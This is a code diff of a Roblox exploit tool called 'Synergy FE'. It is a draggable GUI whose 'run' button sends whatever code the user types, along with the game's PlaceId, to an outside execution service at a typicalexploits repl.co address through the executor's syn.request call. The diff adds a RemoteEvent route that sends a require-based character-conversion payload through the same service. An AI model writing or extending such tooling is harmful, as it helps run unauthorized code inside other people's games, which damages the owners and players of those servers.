@@ -1,5 +1,4 @@
 --// Instances
-
 local Player = game.Players.LocalPlayer.Name
 
 local screen_gui = Instance.new("ScreenGui")
@@ -26,8 +25,8 @@ source.TextSize = 14
 source.TextXAlignment = Enum.TextXAlignment.Left
 source.TextYAlignment = Enum.TextYAlignment.Top
 source.BackgroundColor3 = Color3.new(1, 1, 1)
-source.Position = UDim2.new(0.0266343821, 0, 0.0517241396, 0)
-source.Size = UDim2.new(0, 390, 0, 237)
+source.Position = UDim2.new(0.0266343821, 0, 0.146551728, 0)
+source.Size = UDim2.new(0, 390, 0, 204)
 source.Visible = true
 source.Name = "Source"
 source.Parent = main_frame
@@ -78,6 +77,24 @@ r6.Visible = true
 r6.Name = "r6"
 r6.Parent = main_frame
 
+local text_label = Instance.new("TextLabel")
+text_label.Font = Enum.Font.SourceSans
+text_label.Text = "Synergy FE"
+text_label.TextColor3 = Color3.new(0, 0, 0)
+text_label.TextSize = 14
+text_label.BackgroundColor3 = Color3.new(1, 1, 1)
+text_label.Position = UDim2.new(0.0266343821, 0, 0.0229885057, 0)
+text_label.Size = UDim2.new(0, 388, 0, 32)
+text_label.Visible = true
+text_label.Parent = main_frame
+
+local remote_event = Instance.new("RemoteEvent")
+remote_event.Parent = main_frame
+
+local fire_event = Instance.new("LocalScript")
+fire_event.Name = "FireEvent"
+fire_event.Parent = main_frame
+
 --//Modules
 
 local modules = {}
@@ -113,6 +130,8 @@ task.spawn(function()
 		return oldreq(target)
 	end
 
+	script.Parent.Parent.ResetOnSpawn=false
+	
 	script.Parent.run.MouseButton1Click:Connect(function()
 		local code = script.Parent.Source.Text
 	
@@ -132,18 +151,16 @@ task.spawn(function()
 			Body=game:GetService("HttpService"):JSONEncode(Data)
 		})
 	end)
+	script.Parent.RemoteEvent.OnServerEvent:Connect(function(MainPlayer)
+		local code2 = "require(6861971724).convert("..MainPlayer.Name..")"
 	
-	script.Parent.r6.MouseButton1Click:Connect(function()
-		
-		local code = "require(6861971724).convert("..Player..")"
-		
 		local PlaceId = game.PlaceId
-		
+	
 		local Data = {
 			placeid=PlaceId,
-			code=code
+			code=code2
 		}
-		
+	
 		syn.request({
 			Url="https://executionbot-1.typicalexploits.repl.co/code",
 			Method="POST",
@@ -152,8 +169,9 @@ task.spawn(function()
 			},
 			Body=game:GetService("HttpService"):JSONEncode(Data)
 		})
-	
 	end)
+	
+	
 end)
 
 -- drag
@@ -169,4 +187,22 @@ task.spawn(function()
 	end
 
 	local a=game:GetService("UserInputService")function drag(b)dragToggle=nil dragSpeed=0.23 dragInput=nil dragStart=nil dragPos=nil function updateInput(a)Delta=a.Position-dragStart Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+Delta.X,startPos.Y.Scale,startPos.Y.Offset+Delta.Y)game:GetService("TweenService"):Create(b,TweenInfo.new(0.25),{Position=Position}):Play()end b.InputBegan:Connect(function(c)if(c.UserInputType==Enum.UserInputType.MouseButton1 or c.UserInputType==Enum.UserInputType.Touch)and a:GetFocusedTextBox()==nil then dragToggle=true dragStart=c.Position startPos=b.Position c.Changed:Connect(function()if c.UserInputState==Enum.UserInputState.End then dragToggle=false end end)end end)b.InputChanged:Connect(function(a)if a.UserInputType==Enum.UserInputType.MouseMovement or a.UserInputType==Enum.UserInputType.Touch then dragInput=a end end)game:GetService("UserInputService").InputChanged:Connect(function(a)if a==dragInput and dragToggle then updateInput(a)end end)end drag(script.Parent)
+end)
+
+-- FireEvent
+task.spawn(function()
+	local script = fire_event
+
+	local oldreq = require
+	local function require(target)
+		if modules[target] then
+			return modules[target]()
+		end
+		return oldreq(target)
+	end
+
+	script.Parent.r6.MouseButton1Click:Connect(function()
+		script.Parent.RemoteEvent:FireServer()
+	end)
+	
 end)
